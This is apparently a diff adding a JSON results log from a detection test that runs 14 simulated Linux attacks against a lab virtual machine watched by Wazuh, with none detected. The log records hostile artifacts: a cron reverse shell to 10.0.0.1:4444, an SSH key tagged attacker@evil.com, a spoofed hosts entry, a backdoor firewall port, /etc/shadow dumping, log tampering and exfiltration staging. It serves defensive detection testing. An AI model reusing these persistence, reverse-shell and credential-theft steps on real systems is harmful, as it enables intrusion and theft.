@@ -1,0 +1,239 @@
+{
+  "run_id": "WAZUH_LINUX_TEST_20260806_084543",
+  "target": "192.168.56.101",
+  "start_time": "2026-08-06T08:45:44Z",
+  "attacks_total": 14,
+  "attacks_succeeded": 14,
+  "wazuh_linux_alerts": 0,
+  "wazuh_tagging_alerts": 0,
+  "attacks_detected": 0,
+  "results": [
+    {
+      "name": "SSH Brute Force",
+      "scenario_id": "linux_001",
+      "success": true,
+      "description": "5 failed SSH login attempts to user 'ubuntu' with wrong passwords from remote host.",
+      "details": {
+        "target_user": "ubuntu",
+        "attempts": [
+          {
+            "password": "password",
+            "result": "auth_failed"
+          },
+          {
+            "password": "123456",
+            "result": "auth_failed"
+          },
+          {
+            "password": "admin123",
+            "result": "auth_failed"
+          },
+          {
+            "password": "letmein",
+            "result": "auth_failed"
+          },
+          {
+            "password": "ubuntu123",
+            "result": "auth_failed"
+          }
+        ]
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Cron Job Persistence",
+      "scenario_id": "linux_003",
+      "success": true,
+      "description": "Created malicious cron job for persistence.",
+      "details": {
+        "cron_file": {
+          "cmd": "cat /opt/attack_test/fake_cron/malicious",
+          "stdout": "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+          "stderr": "",
+          "status": 0
+        },
+        "crontab": {
+          "cmd": "crontab -l",
+          "stdout": "# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_092146\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_094126\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_094619\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_094942\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_101414\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_102433\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260730_102801\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260801_143917\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260801_150207\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260801_151236\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260801_202539\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260806_084543",
+          "stderr": "",
+          "status": 0
+        }
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "SUID Binary Abuse",
+      "scenario_id": "linux_004",
+      "success": true,
+      "description": "Created SUID binary to escalate privileges.",
+      "details": {
+        "binary": "-rwsr-xr-x 1 vboxuser vboxuser 216632 Aug  6 08:46 /opt/attack_test/suid_find"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Unauthorized User Creation",
+      "scenario_id": "linux_005",
+      "success": true,
+      "description": "Created unauthorized user with sudo privileges.",
+      "details": {
+        "user": "hacker_084543",
+        "passwd_entry": "hacker_084543:x:1001:1001::/home/hacker_084543:/bin/bash"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "SSH Key Injection",
+      "scenario_id": "linux_006",
+      "success": true,
+      "description": "Injected unauthorized SSH key into authorized_keys.",
+      "details": {
+        "key_added": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackKeyWAZUH_LINUX_TEST_20260806_084543 attacker@evil.com"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Systemd Backdoor",
+      "scenario_id": "linux_007",
+      "success": true,
+      "description": "Created malicious systemd service file.",
+      "details": {
+        "service_file": "/opt/attack_test/fake_systemd/backdoor.service"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Bashrc Persistence",
+      "scenario_id": "linux_008",
+      "success": true,
+      "description": "Injected malicious alias into .bashrc for persistence.",
+      "details": {
+        "tail": "fi\nfi\n# ATTACK_WAZUH_LINUX_TEST_20260806_084543"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Log Tampering",
+      "scenario_id": "linux_009",
+      "success": true,
+      "description": "Tampered with log files and cleared bash history.",
+      "details": {
+        "log_after_tamper": "Jul 10 10:00:00 host sshd[1234]: Accepted password for root from 1.2.3.4 port 54321 ssh2\nJul 10 10:02:00 host sudo[1236]: mike : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
+        "history_cleared": true
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Credential Dumping",
+      "scenario_id": "linux_010",
+      "success": true,
+      "description": "Read /etc/shadow to dump password hashes.",
+      "details": {
+        "users_with_hashes": [
+          "systemd-network",
+          "dhcpcd",
+          "messagebus",
+          "systemd-resolve",
+          "_chrony",
+          "tss",
+          "systemd-oom",
+          "nm-openvpn",
+          "tcpdump",
+          "fwupd-refresh",
+          "pipewire",
+          "gnome-remote-desktop",
+          "polkitd",
+          "rtkit",
+          "colord",
+          "gdm",
+          "vboxuser",
+          "sshd",
+          "mysql"
+        ],
+        "shadow_lines": 53
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Sudoers Modification",
+      "scenario_id": "linux_011",
+      "success": true,
+      "description": "Modified sudoers to grant unauthorized privileges.",
+      "details": {
+        "sudoers_d": "README\nzzz_attack_test"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Hosts File Modification",
+      "scenario_id": "linux_012",
+      "success": true,
+      "description": "Modified /etc/hosts for DNS spoofing.",
+      "details": {
+        "hosts_tail": "ff02::2 ip6-allrouters\n# ATTACK_WAZUH_LINUX_TEST_20260806_084543\n10.0.0.1 evil.com update.microsoft.com"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Firewall Tampering",
+      "scenario_id": "linux_013",
+      "success": true,
+      "description": "Added firewall rule to open backdoor port 4444.",
+      "details": {
+        "rule_added": "1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:4444"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "System Reconnaissance",
+      "scenario_id": "linux_014",
+      "success": true,
+      "description": "Performed system enumeration and reconnaissance.",
+      "details": {
+        "OS info": "Linux Ubuntu-Wazuh 7.0.0-28-generic #28-Ubuntu SMP PREEMPT_DYNAMIC Sun Jun 21 01:01:36 UTC 2026 x86_64 GNU/Linux",
+        "Current user": "uid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),111(lpadmin),114(lxd)\nvboxuser",
+        "OS release": "PRETTY_NAME=\"Ubuntu 26.04 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"26.04\"\nVERSION=\"26.04 LTS (Resolute Raccoon)\"\nVERSION_CODENAME=resolute\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL",
+        "Running processes": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nvboxuser    8765  200  0.0  12496  4836 ?        R    08:46   0:00 ps aux --sort=-%cpu\nwazuh-i+    1545 59.7 20.9 5030984 159",
+        "Open ports": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:631           0.0.0.0:*   ",
+        "SUID files": "/snap/core24/1643/usr/bin/chfn\n/snap/core24/1643/usr/bin/chsh\n/snap/core24/1643/usr/bin/gpasswd\n/snap/core24/1643/usr/bin/mount\n/snap/core24/1643/usr/bin/newgrp\n/snap/core24/1643/usr/bin/passwd\n/snap/",
+        "Crontab": "# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files ",
+        "Home directories": "total 12\ndrwxr-xr-x  3 root     root     4096 Aug  6 08:46 .\ndrwxr-xr-x 20 root     root     4096 Jun 21 12:33 ..\ndrwxr-x--- 19 vboxuser vboxuser 4096 Aug  6 08:46 vboxuser",
+        "Sudo permissions": "User vboxuser may run the following commands on Ubuntu-Wazuh:\n    (ALL : ALL) ALL",
+        "Login history": ""
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Data Exfiltration",
+      "scenario_id": "linux_015",
+      "success": true,
+      "description": "Staged sensitive data for exfiltration.",
+      "details": {
+        "files": {
+          "/etc/passwd": "accessible",
+          "/etc/shadow": "accessible",
+          "/home/vboxuser/.bash_history": "accessible",
+          "/home/vboxuser/.ssh/known_hosts": "denied",
+          "/var/log/auth.log": "accessible"
+        },
+        "staged": "-rw-r--r-- 1 root root 2.0K Aug  6 08:46 /tmp/exfil_WAZUH_LINUX_TEST_20260806_084543.b64"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    }
+  ],
+  "detections": []
+}
